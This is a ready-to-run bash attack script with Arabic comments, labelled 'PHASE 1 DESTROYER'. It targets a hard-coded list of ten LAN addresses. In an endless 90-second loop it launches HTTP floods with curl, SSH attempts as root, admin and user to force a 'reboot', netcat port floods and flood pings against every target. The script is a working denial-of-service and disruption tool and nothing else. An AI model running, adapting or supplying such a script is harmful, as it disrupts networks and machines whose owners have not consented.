#!/bin/bash

# ===========================================
# 💀 PHASE 1 DESTROYER - PRIMARY ASSAULT
# الهجوم الأول الأساسي
# ===========================================

clear
echo "████████████████████████████████████████"
echo "█          🔥 PHASE 1 ATTACK 🔥        █"
echo "█         الهجوم الأول المدمر          █"
echo "████████████████████████████████████████"

# قائمة الأهداف المعادية
TARGETS=(
    "192.168.1.15" "192.168.1.16" "192.168.1.17"
    "192.168.1.18" "192.168.1.19" "192.168.1.20"
    "192.168.1.50" "192.168.1.57" "192.168.1.72" "192.168.1.79"
)

# الهجوم الأساسي
basic_assault() {
    local target=$1
    echo "🎯 مهاجمة $target - المرحلة الأولى"
    
    # HTTP flooding
    for i in {1..30}; do
        curl -s --max-time 1 "http://$target/" &
        curl -s --max-time 1 "http://$target:8080/" &
        curl -s --max-time 1 "https://$target:443/" &
    done
    
    # SSH attacks  
    for user in root admin user; do
        timeout 2 ssh -o ConnectTimeout=1 $user@$target "reboot" 2>/dev/null &
    done
    
    # Port flooding
    for port in 22 80 443 8080; do
        echo "PHASE1_ATTACK" | nc -w1 $target $port 2>/dev/null &
    done
    
    # Ping storm
    ping -c 50 -f $target > /dev/null 2>&1 &
}

# تنفيذ الهجوم على جميع الأهداف
echo "⚡ بدء المرحلة الأولى من الدمار..."
for target in "${TARGETS[@]}"; do
    basic_assault $target &
done

# حلقة استمرار الهجوم
cycle=1
while true; do
    echo "🔄 دورة الهجوم الأول #$cycle - $(date)"
    
    for target in "${TARGETS[@]}"; do
        basic_assault $target &
    done
    
    echo "💥 المرحلة الأولى - الدورة $cycle مكتملة"
    echo "$(date): Phase 1 Cycle $cycle completed" >> /tmp/phase1.log
    
    ((cycle++))
    sleep 90  # راحة 1.5 دقيقة بين الدورات
done
